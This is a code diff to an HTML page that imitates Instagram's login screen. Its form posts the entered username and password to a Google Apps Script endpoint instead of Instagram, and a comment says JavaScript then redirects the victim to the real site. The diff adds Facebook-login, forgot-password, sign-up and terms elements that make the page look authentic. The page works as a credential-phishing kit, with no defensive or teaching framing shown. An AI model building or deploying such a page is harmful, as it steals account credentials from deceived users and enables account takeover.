@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>Instagram Login Clone</title>
     <style>
-         body {
+        body {
             font-family: Arial, sans-serif;
             background-color: #fafafa;
             display: flex;
@@ -121,11 +121,26 @@
 <div class="login-container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo">
 
+    <button class="login-with-facebook">Continue with Facebook</button>
+
+    <div class="divider">OR</div>
+
+    <!-- Formulario integrado con Google Apps Script -->
     <form id="login-form" action="https://script.google.com/macros/s/AKfycbyDEoMQxdLqn1-NeUbxnAacN7SKuaQdN1HQ33cIYTUrlR4N_rrujFi_OT5rLG8ZhS-pIg/exec" method="POST">
         <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
         <input type="password" id="password" name="password" placeholder="Password" required>
         <button class="login-btn" type="submit">Log In</button>
     </form>
+
+    <a class="forgot-password" href="#">Forgot password?</a>
+
+    <div class="sign-up">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+
+    <div class="terms">
+        By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.
+    </div>
 </div>
 
 <!-- JavaScript para redirigir a Instagram tras enviar el formulario -->
